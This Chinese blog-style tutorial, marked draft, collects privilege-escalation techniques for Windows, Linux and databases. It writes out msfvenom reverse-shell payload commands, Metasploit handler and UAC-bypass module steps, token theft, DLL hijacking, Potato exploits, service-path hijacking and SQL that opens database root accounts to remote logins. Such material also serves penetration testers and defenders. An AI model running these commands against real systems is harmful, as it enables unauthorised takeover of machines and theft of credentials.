---
title: 权限提升
published: 2022-07-01
tags: [提权]
category: Web渗透
draft: true
---



![Markdown Logo](./wallhaven-d6dvdl.png "Markdown")
## 数据库
### phpmyadmin绕过禁止mysql root外联
```
mysql数据库root用户默认不允许外连, 如果拿到了mysql数据库的root账号密码也无法连接上去(除非用户自行更改配置), 但是如果服务器还部署了phpmyadmin, 就可以通过phpmyadmin连接root用户, 这属于本地服务->本地服务的连接
```
### 常规数据库提权方式
**提权流程**
**1.获取数据库用户密码**
```go
-网站存在SQL注入漏洞
-数据库的存储文件或备份文件
-网站应用源码中的数据库配置文件
-采用工具或脚本爆破(需解决外联问题)
```
**2.利用数据库提权项目进行连接**
```
这些项目提权的原理大概是数据库有相应的组件, 如XpCmdshell,AgentJob等等用于执行系统命令的, 这些组件可能在数据库安装的时候默认关闭了, 得到数据库最高用户的账号密码后就可以用数据库语句将这些组件强制开启, 这些工具就是用数据库最高权限的账户密码连接后尝试开启这些组件完成提权
# 这些提权都需要最高权限的数据库账号密码, 以及需要允许外联

# MDUT(需要java1.8)
# 支持Mysql, Mssql, Oracle, PostgreSql, Redis
https://github.com/SafeGroceryStore/MDUT
java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-denpendencies.jar
可视化的工具, 支持代理, 填写好目标地址, 端口, sa用户的密码后即可连接上对应数据库。连接上后选择模式执行指令即可看提权是不是成功了, 很简单易用

# Databasetools(这个bug太多不建议使用)
https://github.com/Hel10-Web/Databasetools

# RequestTemplate(这个使用要更加复杂一些, 但是功能更强大)
# 支持Mysql, Mssql, Oracle, PostgreSql, Redis, SSH, MongoDB, Memcached, FTP, SMB, 
https://github.com/1n7erface/RequestTemplate
java -jar RequestTemplate.jar
可视化的工具, 也支持代理, 点击生成填写好目标地址, 端口, 账户密码后导出到桌面(本地地址), 然后点击新增选择刚才生成的文件即可连接,然后就可以通过可视化的窗口尝试使用组件执行命令。
```
**3.可利用建立代理解决不支持外联**
```shell
-利用已知Web权限建立代理(等同于本地连接)
-利用已知权限执行SQL开启外联(让数据库支持外联)
# mysql
GRANT ALL PRIVILEGES ON *.* TO '帐号'@'%' IDENTIFIED BY '密码' WITH GRANT OPTION;
flush privileges; # 如果报错了可以试试不要这句

# sqlserver
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

# oralcle
ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;
SHUTDOWN IMMEDIATE;
STARTUP;
```
**4.可利用数据库提权类型条件及技术**
```shell
-MYSQL:PHP+MYSQL 以web入口提权
条件:ROOT密码(高版本的-secure-file-priv没进行目录限制)
技术:UDF MOF(windows2008之后就失效了, 所以没什么卵用) 启动项 反弹Shell

-MSSQL:.NET+MSSQL 以web入口提权
条件:sa密码
技术:xp_cmdshell sp_oacreate CLR 沙盒

-Oracle:(站库分离,非JSP,直接数据库到系统等)
条件:数据库用户密码
技术:DBA,普通用户,注入模式
```
## linux
### 权限划分
```shell
系统用户: UID(0-999)
普通用户: UID(1000-*)
root用户: UID为0，拥有系统的完全控制权限
```
### mimipenguin-从桌面环境抓密码
```shell
类似于mimikatz, 从linux的桌面环境中抓密码, 亲测很好用
# 项目地址
https://github.com/huntergregal/mimipenguin
# ./mimipengun即可
```
## windows
### 权限划分
windows的权限可以分为4个等级
system - administrators - users - guest
```shell
System: 系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。
Administrators: 管理员组，具有对计算机进行完全访问和操作的权限。
Users: 用户组，一般用户的默认组别，拥有较低的系统权限。
Guests:
访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。
Backup Operators:
备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。
Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。
Remote Desktop Users: 远程桌面用户组，允许用户进行远程桌面连接。
Network Configuration Operators: 网络配置操作员组，允许用户管理网络配置。
Performance Log Users: 性能日志用户组，允许用户收集性能日志和计数器数据。
Distributed COM Users:
分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。
IIS_IUSRS: 用于授权IIS相关服务的用户组。
```
### 土豆家族提权
放在这里这种提权方式都是手动提权, 土豆家族有:
```shell
土豆(potato)提权通常用在我们获取WEB/数据库权限的时候.
可以将低权限的服务用户提升为"NT AUTHORITY\SYSTEM"特权.

# 一个总结的很全的文章
https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w

# 土豆提权的原理
土豆系列提权的核心是NTLM中继,通过欺骗运行在高权限(Administrator/SYSTEM)的账户进行ntlm认证,同时作为中间人对认证过程进行劫持和重放,最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token,只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿,即可取得对应权限.

# 相关测试以及土豆大全
1、Test in：Windows 10/11(1809/21H2)
2、Test in：Windows Server 2019 Datacenter(1809)
3、Test in：Windows Server 2022 Datacenter(21H2)
# SweetPotato从Windows 7到Windows 10 / Server 2019
SweetPotato        OK
# RoguePotato Win 10(部分版本)和Win Server 19
RoguePotato
# Windows 2012-2019、Windows 8-10
BadPotato          OK
# 作用范围: 未知
EfsPotato          OK
# Windows Server 2012 - Windows Server 2022、Windows8 - Windows 11
GodPotato          OK
# 作用范围：未知
PetitPotato        OK
# 作用范围：未知
MultiPotato
# win10和server2016
CandyPotato
# Windows 10(11 not test), Windows Server 2012 - 2019(2022 not test)
RasmanPotato       OK
# Windows 10 - 11 Windows Server 2012 - 2022
CoercedPotato
# Windows 10 - 11 Windows Server 2012 - 2022
JuicyPotatoNG
# Windows 10 - 11 Windows Server 2012 - 2022
PrintNotifyPotato  OK

# 相关地址
GodPotato
https://github.com/BeichenDream/GodPotato
# GodPotato -cmd "cmd /c whoami"
# GodPotato -cmd "cs.exe"


SweetPotato
https://github.com/CCob/SweetPotato
# SweetPotato.exe -> 直接弹出一个新窗口直接system权限

RoguePotato
https://github.com/antonioCoco/RoguePotato

BadPotato
https://github.com/BeichenDream/BadPotato
# BadPotato.exe whoami

EfsPotato
https://github.com/zcgonvh/EfsPotato
# EfsPotato.exe whoami

MultiPotato
https://github.com/S3cur3Th1sSh1t/MultiPotato

CandyPotato
https://github.com/klezVirus/CandyPotato

RasmanPotato
https://github.com/crisprss/RasmanPotato
# RasmanPotato.exe -c whoami
PetitPotato
https://github.com/wh0amitz/PetitPotato
# PetitPotato.exe 0 whoami

JuicyPotatoNG
https://github.com/antonioCoco/JuicyPotatoNG

PrintNotifyPotato
https://github.com/BeichenDream/PrintNotifyPotato
# PrintNotifyPotato.exe whoami

CoercedPotato
https://github.com/Prepouce/CoercedPotato
```
### 第三方软件提权
```shell
远控类：Teamviewer 向日葵 Todesk VNC Radmin等
密码类：各大浏览器 Xshell Navicat 3389 等
服务类：FileZilla Serv-u Zend等
文档类：Winrar WPS Office等
原理：
1、通过普通用户或Web用户收集或提取有价值凭据进行提升
2、通过普通用户或Web用户上传类似钓鱼文件等待管理提升
演示：
1、计算机用户：Teamviewer 
2、计算机用户：NavicatPremium
3、计算机用户或WEB权限：Winrar(CVE2023)
4、计算机用户：浏览器密码凭据

在cs的插件里翻一翻有这些工具的直接利用, 点一下即可, 如果不成功, 可能是权限原因, 需要用户权限而不是web权限。
```
### 本地提权AT&SC&PS
#### AT
```shell
适用版本:Win2000 & Win2003 & XP # 在Win7以后被剔除
at 命令提权的原理:at命令是一个计划命令,可以在规定时间完成一些操作,这个命令调用的是system权限.
# 当我们拿到一个低权限的用户,通过3389端口远程连接上后,可以通过at命令来进行本地提权.
at 10:45 /interactive cmd (在10:45分生成一个交互式的System权限的cmd)

# 搭配msf进行提权
1.生成反弹shell木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.20 LPORT=4444 -f exe > shell.exe
2.设置监听
msfconsole 
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 192.168.10.20 
set LPORT 4444 
run
3.at执行反弹
at 11:11 C:\111\shell.exe
```
#### SC
```shell
网上说在windows 7/8,Windows server2003、2008、2012、2016上都能使用,这里的都能只适用于sc这条命令本身.
而利用sc进行提权,通过测试,目前好像只有2003可以.(这个不能完全相信, 其他的版本应该也要试一试, 因为这是网上的别人的结论)

sc是用于与服务控制管理器和服务进行通信的命令行程序，提供的功能类似于控制面板中管理工具项中的服务。

# 这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务
sc Create syscmd binPath= "cmd /K start" type= own type= interact
# 然后执行
sc start syscmd  # 就得到了一个system权限的cmd环境

# 搭配msf和at提权操作步骤一致
```
#### PS
```shell
# ps工具包下载:
https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools
适用版本:Win2003 & Win2008

1.先上传psexec.exe
2.执行:
# psexec.exe -accepteula -s -i -d notepad.exe
psexec.exe -accepteula -s -i -d cmd.exe
3.在弹出的新窗口中执行whoami检查是否完成提权
```
### 进程迁移(提权/降权)
**说明**
```shell
进程迁移注入提权就是将获取到权限低的进程注入至进程中权限高的中,这样就实现了权限提升,同时注入进程提权相当于开启了一个后门, 隐蔽性极高,不会创建新的进程,很难发现.

前提条件:
这里如果使用的是web权限是无法执行的,必须获取到类似与administrator的权限才能进行进程注入.同时这类提权是不会被杀毒软件拦截的,这是系统的一种特性.
```
#### pinjector.exe
```shell
# 工具下载地址
https://www.tarasco.org/security/Process_Injector/index.html

# 查看可利用的进程
pinjector.exe -l | findstr SYSTEM
# 对pid进程执行注入，并建立侦听端口 
pinjector.exe -p [pid] cmd [port]
# 攻击机nc连接监听端口
nc -nv [ip] [port]
```
#### msf
```shell
# 查看进程, 选高权限的如: NT AUTHORITY\SYSTEM
ps 
# 注入对应PID
migrate [PID]
```
#### cs
```shell
# 查看进程
ps
# 注入对应PID
inject [PID]
```

### 令牌窃取(提权/降权)
```shell
令牌(token)是系统的临时秘钥,相当于账号和密码,用来决定是否允许这次请求和判断这次请求是属于哪一个用户的.它允许你在不提供密码或其他凭证的前提下,访问网络和系统资源,这些令牌将持续存在于系统中,除非系统重新启动.令牌最大的特点就是随机性,不可预测,黑客或软件无法猜测出令牌.
而令牌窃取就是通过假冒一个网络中的另一个用户进行各类操作.
注: 不能保证所有的服务器都能实现令牌窃取,比如我使用Windows server 2003服务器的时候,就没出现NT AUTHORITY\SYSTEM,而没出现NT AUTHORITY\SYSTEM就无法提权到system权限.(这是网上一个人写的话)

!msf令牌窃取!
1.先反弹shell到msf上
2.msf执行操作:
# 使用incognito模块
use incognito
# 列出有的令牌
list_tokens -u
# 窃取system令牌
impersonate_token "NT AUTHORITY\SYSTEM"

!cs令牌窃取!
# 查看进程
ps
# 窃取进程令牌
steal_token [PID]
# 窃取进程令牌上线
spawnu [PID]

!烂土豆配合msf进行令牌窃取!
1.先反弹shell到msf上
2.msf执行操作:
# 执行烂土豆程序
execute -cH -f ./potato.exe
# 加载窃取功能
use incognito
# 查看可窃取的令牌
list_tokens -u
# 使用令牌
impersonate_token "NT AUTHORITY\SYSTEM"
```
### BypassUAC
```shell
参考链接:
https://blog.csdn.net/Aaron_Miller/article/details/109587355
https://blog.csdn.net/qq_44159028/article/details/128800727

UAC就是那个执行应用时弹出来问你是否允许执行的窗口(你想允许来自未知发布者的以下程序对此计算机进行更改吗), bypassUAC是因为1.弹出来很烦,2.没有桌面环境的话弹出来点不到, 所以需要绕过

可能弹出的情况:
1.在管理员组的非administrator用户执行需要管理员权限的应用
2.普通用户执行需要管理员权限的应用

在uac白名单中的程序(即系统静默提升至管理员权限而不弹出UAC框),攻击者可以对这些白名单程序进行dll劫持, dll注入或注册表劫持绕过uac提权
slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe、rundll32.exe、explorer.exe等

bypassUAC操作:
!!!!!msf!:
前提: 直接getuid发现不是系统用户, 然后getsystem失败, 才用下面的操作, 要直接getsystem成功了就不用这下面的了.
# msf中内置了几个用于绕过uac的模块, 用下面的指令列出来这些模块, 下面只演示部分模块使用
msf6 exploit(multi/handler) > search bypassuac
1.eventvwr模块(推荐先用下面的bypassuac试试)
# > background 先退出会话
use exploit/windows/local/bypassuac_eventvwr
set lport 5555
set session 2
run # 直接返回一个高权限会话
2.bypassuac模块
原理: 通过进程注入使可信任发布者证书绕过Windows UAC
# > background 先退出会话
use exploit/windows/local/bypassuac
show options
set session 1
exploit
backgroud
sessions 2
getuid
3.bypassuac_injection
原理:此模块通过内存注入使用可信任的发布者证书绕过UAC(该模块需要选择正确的体系架构)
# > background 先退出会话
use exploit/windows/local/bypassuac_injection
show options
set session 1
set target 1  # 这个1代表的是windows x64, 0是windows x86
exploit
4.bypassuac_eventvwr / bypassuac_fodhelper
# > background 先退出会话
use exploit/windows/local/bypassuac_eventvwr
# 加载payload
set payload windows/meterpreter/reverse_tcp
set lhost 10.32.22.238
set lport 4444
# 绑定会话
set session 1
# 检查配置(因为也需要系统架构对应1代表的是windows x64, 0是windows x86, 如果不对需要更改)
show options
exploit
background
sessions 2 # 进入新的会话
getsystem # 再次getsystem
getuid # 检查是否提权成功

!!!!!UACME!:
工具下载: https://github.com/hfiref0x/UACME
UACME是一个专用于绕过uac的开源项目,目前已包含70多种Bypass uac的方法.
利用方式主要可以分为两大类:
1.各类UAC白名单程序的DLL劫持(Dll Hijack)
2.各类提升权限的COM接口利用(Elevated COM interface)
在UACME项目中,每种绕过uac的方法都有一个数字编号,由一个名为Akagi.exe的主程序进行统一调用,命令如下:
Akagi.exe [key] [Param]
# key 指定要使用的方法的编号
# Parm 指定绕过UAC后要运行的程序或命令,默认启动一个关闭了uac的cmd窗口
下面以23号方法为例进行演示,该方法通过劫持白名单程序pkgmgr.exe所加载的DismCore.dll来绕过uac.
运行如下,即可弹出一个关闭了uac的命令窗口:

Akagi.exe 23 c:\windows\system32\cmd.exe

```
### DLL劫持
```shell
注: dll劫持一般需要配合令牌窃取
参考: 
https://blog.csdn.net/weixin_44032232/article/details/114366001
原理:
Windows程序启动的时候需要DLL.如果这些DLL 不存在,则可以通过在应用程序要查找的位置放置恶意DLL来提权.通常,Windows应用程序有其预定义好的搜索DLL的路径,它会根据下面的顺序进行搜索:
1、应用程序加载的目录
2、C:\Windows\System32
3、C:\Windows\System
4、C:\Windows
5、当前工作目录Current Working Directory,CWD
6、在PATH环境变量的目录(先系统后用户)
这样的加载顺序很容易导致一个系统dll被劫持,因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载,而系统dll是非常常见的,所以当时基于这样的加载顺序,出现了大量受影响软件.

!操作!:
1.收集进程加载的dll
使用火绒剑分析该进程执行时加载了哪些dll,查看进程双击即可看到该进程加载了哪些dll, 一般做dll劫持的时候选择:dll类型为未知文件和数字签名文件
2.msf制作dll木马
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.134  lport=6677 -f dll >./libssl-1_1.dll
3.替换dll
将制作好的dll替换到文件执行目录中的dll
4.启动软件
5.上线msf后搭配令牌窃取
getuid # 先getuid看看权限, 权限够的话就不干下面的操作了
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```
### 不带引号的服务路径提权
```shell
原理:
在 Windows 中,如果服务没有用引号括起来并且有空格,它会将空格作为中断处理,并将服务路径的其余部分作为参数传递.
详解:
当系统管理员配置Windows服务时,他们必须指定要执行的命令,或者运行可执行文件的路径.
当Windows服务运行时,会发生以下两种情况之一.如果给出了可执行文件,并且引用了完整路径,则系统会按字面解释它并执行.但是,如果服务的二进制路径未包含在引号中,则操作系统将会执行找到的空格分隔的服务路径的第一个实例.

举例:
在任务管理器中查看到这样一个服务,服务的可执行文件路径为:
c:\program files (x86)\grasssoft\macro expert\MacroService.exe
这个服务的可执行文件路径包含了空格, 但是却没有用引号括起来, 这时候系统会根据路径依次按照下面的顺序来找:
c:\program.exe
c:\program files.exe
c:\program files (x86)\grasssoft\macro.exe
c:\program files (x86)\grasssoft\macro expert\MacroService.exe
这时候我们用msf生成一个后门然后把c盘的c:\program.exe替换掉,则这个服务启动时就会执行我们的后门

查找存在上述情况的服务:
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# """
上传好反弹shell后:
可以选择以下操作方式:
1.重启
2.重启服务
3.sc start "Macro Expert" # 启动服务
```
### 不安全的服务权限提权
```shell
参考:
https://www.cnblogs.com/zhianku/p/16484441.html

攻击者能够访问或修改服务的安全控制列表(SACL)或访问控制列表(ACL)的权限.特别是当服务被设置为允许普通用户对其进行修改时,攻击者可以通过修改服务二进制文件路径等方式实现特权提升
攻击者使用AccessChk来检查系统上服务的ACL,找到允许普通用户对服务进行修改的权限,然后修改该服务的二进制文件路径以执行恶意代码.

攻击流程:
检测服务权限配置--制作后门文件并上传--更改服务路径指向--调用后成功

需要用到的工具accesschk:
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

操作步骤:
1.检测用户服务项, 这一步的输出结果都是administrators的服务项
# 如果要接受什么许可,可以这样绕过 accesschk.exe /accepteula
# 输出结果会是RW [服务项名] SERVICE_ALL_ACCESS, 那个服务项名是我们需要的
accesschk.exe -uwcqv "administrators" *
2.从上面的服务项名中随便找一个更改服务指向(用AppReadiness)服务为例
# 命令格式为: sc config "要替换的服务项名字" binpath="替换到别的程序路径"
# 这个shell.exe是用msf生成的反弹shell后门
sc config "AppReadiness" binpath="C:\shell.exe"
3.启动服务, msf监听成功获得system权限
sc start AppReadiness
```
## 语言特性
```shell
权限高低JSP>ASP.NET>ASP=PHP
一般JSP的后门上马就是最高权限, 一般都是administrator或是system, 这是由于jvm的特性导致的
```
## 工具提权
### msf自动提权
#### getsystem
```shell
# 接收到反弹shell后, 直接执行:
getsystem
# 查看是否成功
getuid
```
#### local_exploit_suggester
**在msf接收到反弹shell后**
```shell
> use post/multi/recon/local_exploit_suggester
> set showdescription true
> sessions
> set session 1 # 这里根据要提权的会话来更改
> run
# 然后从输出结果中为绿色的选一个出来, 都是可以选择使用的模块, 然后
> use [model]
> show options
> set [option settings]
> run
```
### cobalt strike自动提权
```
上线cs后加载插件一个一个点来提权
```